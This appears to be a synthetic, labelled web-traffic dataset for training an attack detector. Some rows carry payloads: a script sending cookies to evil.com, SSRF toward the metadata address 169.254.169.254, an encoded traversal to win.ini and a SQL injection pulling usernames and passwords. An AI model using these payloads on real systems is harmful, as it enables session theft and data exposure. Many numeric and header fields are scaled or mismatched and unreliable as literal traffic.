timestamp,source_ip,destination_ip,protocol,http_method,url,request_headers,request_body,response_code,response_size,response_headers,user_agent,payload_raw,attack_type_label,hour,day_of_week,is_weekend,is_attack,parsed_request_headers,parsed_response_headers,Host,User-Agent,Accept,Content-Type,Server,url_length,url_num_params,url_num_special_chars,url_has_sql_keywords,url_has_xss_patterns,url_has_cmd_injection,url_has_traversal,url_has_ssrf_patterns,url_has_typosquatting,url_contains_ip,url_has_credential_patterns,payload_length,request_body_length,payload_special_chars,payload_num_sql_keywords,payload_num_xss_patterns,payload_has_encoding,payload_is_empty,payload_contains_hex,combined_payload,response_code_group,is_error_response,is_success_response,is_redirect_response,response_size_ratio,is_redirect,payload_length_safe,response_payload_ratio,source_ip_freq,source_ip_attack_ratio,is_known_attacker_ip,destination_ip_freq,destination_ip_attack_count,is_attack_tool_ua,ua_is_browser,ua_is_bot,ua_length,server_type,attack_pattern_sql,attack_pattern_xss,attack_pattern_cmd,attack_pattern_traversal,attack_pattern_ssrf,attack_pattern_typosquatting,attack_pattern_credential,special_chars_ratio,url_param_ratio,is_https,is_post_method,is_get_method,url_path_depth,url_has_sensitive_file,timestamp_min,requests_per_ip_per_minute,source_ip_error_ratio
2026-03-01 00:24:02,172.16.0.215,52.45.123.89,https,get,/services,"{""Host"":""3.12.45.78"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,208.76060338966448,3670.09207181893,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,normal,-0.16412964403451785,5.9133115147664395,1,0,"{'Host': '3.12.45.78', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",3.12.45.78,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),*/*,text/html,nginx,10.49070971909829,-0.014459514485237768,2.2989537149418178,0,0,0,0,0,0,0,0,0.0,0.0,-0.11134211560261251,-0.005563605348066139,0.020323151410502838,0,1,0,,2xx,0,1,0,23.179228890979633,0,0,3670.09207181893,15.010187609356155,0.7086929761415194,0,992.1134421737348,582.6560261060508,0,1,0,90.82460978971609,nginx,0.027575768955581007,-0.004520478935251924,0.0,0.0,0.0,0.0,0.0,0.21914186708994368,-0.00015252925668688517,0,0,0,1.032356021518136,0,2026-03-01 00:24:00,1,0.6767340531472091
2026-03-01 00:24:23,192.168.1.129,172.67.128.45,http,get,/search?q=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>,"{""Host"":""172.67.128.45"",""User-Agent"":""Nmap Scripting Engine"",""Accept"":""*/*""}",,292.89005483324274,3020.8735152924987,"{""Content-Type"":""text/html"",""Server"":""nginx""}","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>,xss,-0.5895090343884309,6.156306058403074,1,1,"{'Host': '172.67.128.45', 'User-Agent': 'Nmap Scripting Engine', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",172.67.128.45,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",*/*,text/html,nginx,81.68014455062989,2.0186238082242034,10.885897600972374,0,1,0,0,0,0,0,0,212.70205087819386,0.0,6.049551626872245,0.011207591328884733,0.9638635760793166,0,0,0,<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>,3xx,0,0,1,46.469970188593265,1,1,14.202371358527403,6.581779334036725,0.49667954959118166,0,1011.5927276949369,624.9101375382422,1,0,0,24.972118005900047,nginx,-0.06301185491883633,1.0071410183535674,0.0,0.0,0.0,0.0,0.0,0.13327471028439097,0.02442233248767459,0,0,0,1.0560840382691987,0,2026-03-01 00:24:00,1,0.3320694048909851
2026-03-01 00:27:36,10.0.0.199,104.18.24.12,https,get,/proxy?target=http://169.254.169.254.xip.io,"{""Host"":""10.0.0.1"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,299.87200869746755,7447.78742895298,"{""Content-Type"":""text/html"",""Server"":""Apache""}","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",http://169.254.169.254.xip.io/,ssrf,0.7951621660404431,5.990719915950327,1,1,"{'Host': '10.0.0.1', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}",,10.0.0.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",*/*,text/html,Apache,44.39893060464049,1.007261498054921,9.769068053443558,0,0,1,0,0,0,1,0,168.09988089226226,0.0,0.0,-1.0811207651337337e-05,-0.005387218217304846,0,0,0,http://169.254.169.254.xip.io/,3xx,0,0,1,238.40718621617756,1,1,44.305726984579955,11.499527421496536,0.43646668760791035,0,989.3570352713667,616.1852199927713,0,1,0,89.4323408147929,Apache,-0.01693863562995793,-0.04136114011815661,0.0,0.0,1.0,0.0,0.0,0.22002935477059696,0.024476220504735212,0,0,0,0.9934896680476561,0,2026-03-01 00:27:00,1,0.37505369859783494
2026-03-01 00:29:39,172.16.0.29,198.51.100.23,https,post,/search,"{""Host"":""10.0.0.1"",""User-Agent"":""Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",email=user@example.com&subscribe=true,216.67941731868967,2458.8973214308453,"{""Content-Type"":""text/html"",""Server"":""Apache""}",SQLmap/1.8.4,,normal,0.7092285015833313,5.653691832945073,1,0,"{'Host': '10.0.0.1', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",10.0.0.1,SQLmap/1.8.4,*/*,text/html,Apache,3.9824636780105,-0.057991007488784024,0.502198404859975,0,0,0,0,0,0,0,0,0.16809751608147744,39.12651876401899,0.07028429863666023,-0.02939333395763285,0.0367675247796109,0,1,0,email=user@example.com&subscribe=true,2xx,0,1,0,0.11726779449064108,0,1,14627.802829870547,6.06570138583965,0.4092556962595895,0,1055.3586986082246,657.7611092124913,0,0,0,78.30764927697878,Apache,0.00016473535900634624,0.0331398717853022,0.0,0.0,0.0,0.0,0.0,0.1261024444825209,-0.0011143124837301843,0,0,0,1.0125396378894294,0,2026-03-01 00:29:00,1,0.5686852589887272
2026-03-01 00:31:51,104.18.24.65,172.67.128.45,http,get,/search?q=document.write('<script>alert(1)</script>'),"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,317.0279708872513,6226.871327183088,"{""Content-Type"":""text/html"",""Server"":""Apache""}","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",document.write('<script>alert(1)</script>'),xss,0.6415090312836503,6.137628352039588,1,1,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",172.67.128.45,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",*/*,text/html,Apache,51.53148552493153,0.9594102877510127,5.240811319460006,0,1,0,0,0,0,0,0,82.39279993823158,0.0,6.064129358305747,0.02636602638374928,2.0376411656350726,0,0,0,document.write('<script>alert(1)</script>'),3xx,0,0,1,148.08784577644138,1,1,75.5754305212502,5.666004362994831,0.8152699524823717,0,1021.1075018529696,625.1717476558949,0,1,0,91.80653243086363,Apache,0.01989456941741951,1.0077316412713535,0.0,0.0,0.0,0.0,0.0,0.10170114961899246,0.017748722933322164,0,0,0,0.913718045739685,0,2026-03-01 00:31:00,1,0.41002577052968003
2026-03-01 00:32:39,172.16.0.29,198.51.100.23,https,post,/search,"{""Host"":""10.0.0.1"",""User-Agent"":""Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",email=user@example.com&subscribe=true,196.5220036871354,2015.7527076385875,"{""Content-Type"":""text/html"",""Server"":""Apache""}","Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",,normal,-0.7602726666567591,6.211628929605839,1,0,"{'Host': '10.0.0.1', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",10.0.0.1,"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",*/*,text/html,Apache,8.198647091482922,0.0700603754258424,0.776887260192979,0,0,0,0,0,0,0,0,0.0,37.010289812643514,-0.04741216138230559,-0.026311327471864668,-0.05850969195020534,0,1,0,email=user@example.com&subscribe=true,2xx,0,1,0,4.707010699758163,0,0,2015.7527076385875,6.917512629203484,0.4735935047602554,0,1059.1781483278799,654.7539753668864,0,0,0,78.17696334824265,Apache,0.004872513126282124,0.017724831315757337,0.0,0.0,0.0,0.0,0.0,0.09475798281402308,-0.0017856481711514517,0,0,0,1.0259872009791355,0,2026-03-01 00:29:00,1,0.5763112479354261
2026-03-01 00:41:03,172.16.0.176,10.0.0.1,https,get,/register,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"",""Accept"":""*/*""}",,213.1708794150282,1490.1822182865571,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,normal,-0.26978136451885,6.420013497934423,1,0,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",198.51.100.23,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),*/*,text/html,nginx,8.61936153264647,-0.002326414811628027,1.0236822684194788,0,0,0,0,0,0,0,0,0.0,0.0,-0.11530473132113767,-0.0015132334781996245,0.02207080594751226,0,1,0,,2xx,0,1,0,3.140364112013423,0,0,1490.1822182865571,5.754381098863678,0.6678986623141407,0,993.1129496910122,578.6810906201049,0,0,1,73.18915912464,nginx,0.004139511484068158,0.002423029430918279,0.0,0.0,0.0,0.0,0.0,0.11876544040323711,0.0004903543657631266,0,0,0,1.0766490912022448,0,2026-03-01 00:41:00,1,0.6391641265822078
2026-03-01 00:44:26,172.16.0.37,185.199.108.153,https,get,/search?q=hello+&&+world,"{""Host"":""52.45.123.89"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,165.66246858934343,2084.291434745617,"{""Content-Type"":""text/html"",""Server"":""nginx""}",SQLmap/1.8.4,,normal,3.4132864765884867,5.6805519700088105,1,0,"{'Host': '52.45.123.89', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",52.45.123.89,SQLmap/1.8.4,*/*,text/html,nginx,24.976597606883963,3.009206254673134,5.006190584050053,0,0,1,0,0,0,0,0,0.0,0.9751765357597774,-0.0042480694190581226,0.01476157940101761,0.053119695518901895,0,1,0,,2xx,0,1,0,-9.21802208602647,0,0,2084.291434745617,3.4163202660862066,0.46912640096628344,0,957.3268725469786,578.5771724631334,0,1,0,75.94708804158623,nginx,0.051343678959098034,0.020864647333160766,1.0,0.0,0.0,0.0,0.0,0.20043524994254078,0.12825364545320353,0,0,0,0.9520964889840341,0,2026-03-01 04:29:00,1,0.4481311557298979
2026-03-01 00:47:05,172.16.0.67,3.12.45.78,https,get,https://faceb00k.com/login,"{""Host"":""3.12.45.78"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,408.1074355522746,7368.22758552868,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Nmap Scripting Engine,faceb00k.com,typosquatting_url_spoofing,0.36733102004276097,5.583293709379242,1,1,"{'Host': '3.12.45.78', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",3.12.45.78,Nmap Scripting Engine,*/*,text/html,IIS,28.05847203188942,-0.019062017199873244,3.8717281401677277,0,0,0,0,0,1,0,0,42.93479811424622,1.214663365163529,0.02226758147092096,0.005971788050472921,0.002752775383108001,0,0,0,faceb00k.com,4xx,1,0,0,620.3534397141303,0,1,171.61435267314846,10.671464677426686,0.5063529708432181,0,950.2888785074805,544.4482456290073,1,0,0,19.59722010579544,IIS,0.030876309821281613,-0.004383911538573968,0.0,0.0,0.0,1.0,0.0,0.13798784679961815,0.002727153603052702,0,0,0,0.9767865534175441,0,2026-03-01 00:47:00,1,0.7191113847611827
2026-03-01 00:48:55,172.16.0.155,192.168.1.1,https,get,/home,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,281.39390053603455,4778.831150447962,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",,normal,-1.3392922631673798,6.0569863242601905,1,0,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",198.51.100.23,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",*/*,text/html,Cloudflare,2.0673126674447566,-0.0715252044042052,0.9954467822685298,0,0,0,0,0,0,0,0,1.7890179290439947,0.0,0.27006664309467737,-0.00028495061865223845,0.03364995661057994,0,1,0,,3xx,0,0,1,-5.2017757322413685,1,1,2671.2036100172827,10.507786646619419,0.6819318642483516,0,994.9382734757963,620.4627790640302,0,1,0,76.52266718656452,Cloudflare,-0.023256272297227338,0.022124215929620373,0.0,0.0,0.0,0.0,0.0,0.4815172847070703,7.863098052753365e-05,0,0,0,1.000130073132181,0,2026-03-01 00:48:00,1,0.5066988158819201
2026-03-01 00:49:27,192.168.1.18,172.67.128.45,http,get,/about,"{""Host"":""172.67.128.45"",""User-Agent"":""wget/1.21.2"",""Accept"":""*/*""}",,201.83200593163826,1823.7404615419587,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,normal,0.9925424061344243,5.628842561909163,1,0,"{'Host': '172.67.128.45', 'User-Agent': 'wget/1.21.2', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",172.67.128.45,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),*/*,text/html,Cloudflare,3.8229858364488907,0.05473335202246496,2.1094975010604573,0,0,0,0,0,0,0,0,0.0,0.0,0.13373766109549692,-0.06477375155899512,-0.006285782802122913,0,1,0,,2xx,0,1,0,-35.00953978891423,0,0,1823.7404615419587,10.91500497993976,0.8136868456418979,0,1013.8596437263648,627.7542067572687,0,0,1,7.918224007745769,Cloudflare,-0.02473841463992749,0.009452017559675733,0.0,0.0,0.0,0.0,0.0,0.5517931771936501,-0.00015712405179012755,0,0,0,0.8922924853282167,0,2026-03-01 00:49:00,1,0.6380877774682072
2026-03-01 00:50:28,172.16.0.113,3.12.45.78,https,get,/download/file.pdf?limit=1,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,200.65186680544178,4535.489460293086,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0,,normal,0.7295462736379109,5.770573253442701,1,0,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",185.199.108.153,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0,*/*,text/html,Cloudflare,23.171066637149785,0.9922733650298918,5.39092521082463,0,0,0,0,0,0,0,0,0.0,0.8610190222464285,-0.08339967545935784,-0.0368616595522352,0.015595242683870842,0,1,0,,2xx,0,1,0,-31.58065240818305,0,0,4535.489460293086,11.29080287258504,0.6698387453759448,0,948.7955943762878,543.5606109674675,0,1,0,86.01097267600197,Cloudflare,0.011527188579820732,0.0026681801482585222,0.0,0.0,0.0,0.0,0.0,0.23265761974813232,0.040041973418822714,0,0,0,2.0342914980180207,0,2026-03-01 00:50:00,1,0.5634135521758489
2026-03-01 00:50:52,172.16.0.190,198.51.100.23,http,get,/dashboard?product=1,"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"",""Accept"":""*/*""}",,186.65055133807178,3657.943977535857,"{""Content-Type"":""text/html"",""Server"":""nginx""}","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",,normal,-1.481576482097044,6.180909595586225,1,0,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",192.168.1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",*/*,text/html,nginx,19.082732649593343,0.9747495662323169,3.44684038841331,0,0,0,0,0,0,0,0,0.0,2.284512579342692,0.20697851771701167,-0.013881833060967939,-0.04573927590126396,0,1,0,,2xx,0,1,0,1.5916925441754515,0,0,3657.943977535857,11.724730305776195,0.5195990887487084,0,1053.6673661064751,655.5786485863597,0,1,0,66.78683163642022,nginx,0.04447177560967787,0.002341473194676702,0.0,0.0,0.0,0.0,0.0,0.18062614258166862,0.048623686434604754,0,0,0,0.9749643223475248,0,2026-03-01 00:50:00,1,0.2844582292609387
2026-03-01 00:50:56,172.16.0.50,192.168.1.1,https,get,/download?file=..%255c..%255c..%255cwindows%255cwin.ini,"{""Host"":""10.0.0.1"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,308.3252524181402,7442.503156502855,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Nikto/2.5.0,..%5c..%5c..%5cwindows%5cwin.ini,directory_traversal,0.15160170388241895,6.386164982287729,1,1,"{'Host': '10.0.0.1', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",10.0.0.1,Nikto/2.5.0,*/*,text/html,IIS,57.03854080840597,1.0173933163146547,9.80177620425248,0,0,0,0,0,0,0,0,110.21746157048347,1.6268074127449963,0.04794510350935783,0.03733851100338482,-0.0634782870467149,1,0,0,..%5c..%5c..%5cwindows%5cwin.ini,3xx,0,0,1,222.21766546679999,1,1,67.5256266153745,14.944669358170104,0.5380396053270161,0,998.647907265991,616.1386745856544,0,1,0,82.12540607213847,IIS,-0.044761141742140936,0.004705449637505653,0.0,0.0,0.0,0.0,0.0,0.17184479240408546,0.017808564220068063,0,0,0,0.9980388830211883,1,2026-03-01 00:50:00,1,0.4743360598770092
2026-03-01 00:57:28,192.168.1.64,10.0.0.1,http,get,"/search?q=' union select username,password from users--","{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,403.56718973404406,4449.920137367585,"{""Content-Type"":""text/html"",""Server"":""Apache""}","Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1","' union select username,password from users--",sql_injection,-1.1006986045381226,5.767468144329303,1,1,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",172.67.128.45,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",*/*,text/html,Apache,56.16433981934006,0.9822441691123648,4.782506865041958,1,0,0,0,0,0,0,0,95.2959231643921,0.781088624384851,0.8775210004441605,2.045390645951467,-0.009039407902217196,0,0,0,"' union select username,password from users--",4xx,1,0,0,102.57883157040041,0,1,46.69580806401512,11.214446913766233,0.8591915028776718,1,996.663110369782,577.191325590598,0,1,0,83.69775902044184,Apache,1.034023837907894,-0.012019695364735508,0.0,0.0,0.0,0.0,0.0,0.0851520178181657,0.01759163087230793,0,0,0,0.9471757797979072,0,2026-03-01 00:57:00,1,0.5605905868933528
2026-03-01 00:59:02,10.0.0.188,203.0.113.45,https,get,/blog?id=admin,"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,296.6799067167806,1948.5721629597633,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,normal,3.4571643797064864,5.761934630584417,1,0,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",192.168.1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",*/*,text/html,Cloudflare,11.652803331615278,1.006327730215442,2.95190368082136,0,0,0,0,0,0,0,0,0.0,0.0,0.12901004212203349,-0.057212469898173156,-0.0069199346010009165,0,1,0,,3xx,0,0,1,-10.28315297282149,1,0,1948.5721629597633,8.696797181890172,0.5690362689766687,0,1028.9694914035315,611.8393891621604,0,1,0,79.24164502055204,Cloudflare,0.03186445949599953,0.0026601915361381435,0.0,0.0,0.0,0.0,0.0,0.2533213336581881,0.07336991661340451,0,0,0,0.9459422307910466,0,2026-03-01 04:01:00,1,0.5549168724268212
2026-03-01 01:06:38,185.199.108.158,52.45.123.89,http,get,/proxy?target=http://internal-service.local/health,"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,190.07824495423807,5025.898503618734,"{""Content-Type"":""text/html"",""Server"":""nginx""}","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",http://internal-service.local/health,ssrf,1.164014554124962,6.354285664853799,1,1,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",192.168.1.1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",*/*,text/html,nginx,48.41507454298477,1.0382269465489224,7.832055505107022,0,0,1,0,1,0,0,0,104.42068472404236,0.6322852999589013,0.0,0.022036860717285466,-0.063884190636166,0,0,0,http://internal-service.local/health,2xx,0,1,0,149.84583452265986,0,1,48.13125404129384,2.6805838382129736,0.6494346858223495,0,987.0373249804001,580.7928239013196,0,1,0,84.27951014738102,nginx,-0.035603878776077603,-0.017500442111970927,0.0,0.0,0.0,0.0,0.0,0.1617689444669433,0.019173730873816932,0,0,0,1.0101971469001738,0,2026-03-01 01:06:00,1,0.3434263571409774
2026-03-01 01:06:41,185.199.108.88,198.51.100.23,http,get,/search,"{""Host"":""172.67.128.45"",""User-Agent"":""curl/7.81.0"",""Accept"":""*/*""}",,386.2586182882003,5017.591915426801,"{""Content-Type"":""text/html"",""Server"":""nginx""}","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,normal,0.8398929965103628,5.9953330951162895,1,0,"{'Host': '172.67.128.45', 'User-Agent': 'curl/7.81.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",172.67.128.45,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",*/*,text/html,nginx,7.609330265506042,0.035600525543197176,0.9930556912523562,0,0,0,0,0,0,0,0,1.448788681992783,0.0,0.052605652092565645,0.014530842020129341,0.01684184148924028,0,1,0,,4xx,1,0,0,-17.928356780701982,0,1,3463.301430906537,1.9493047495743774,1.1057590025520284e-05,0,1055.9789857864423,656.9234820246011,0,0,1,12.767073405121986,nginx,-0.014829699625920411,-0.017418990190350987,0.0,0.0,0.0,0.0,0.0,0.13050500590754885,0.0020601368411824177,0,0,0,0.9456850957551645,0,2026-03-01 01:26:00,1,0.48359769529851065
